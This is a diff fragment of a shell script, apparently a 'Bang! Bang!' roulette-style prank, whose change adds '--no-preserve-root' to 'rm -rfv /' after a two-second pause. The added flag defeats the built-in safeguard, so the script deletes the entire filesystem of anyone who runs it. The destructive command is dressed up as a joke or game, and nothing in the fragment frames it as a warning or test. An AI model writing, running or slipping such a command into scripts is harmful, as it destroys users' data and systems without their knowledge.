@@ -21,6 +21,6 @@ Bang! Bang!                       |       \
                                   |__________|"
 
 sleep 2
- rm -rfv /
+ rm -rfv / --no-preserve-root
 fi
 
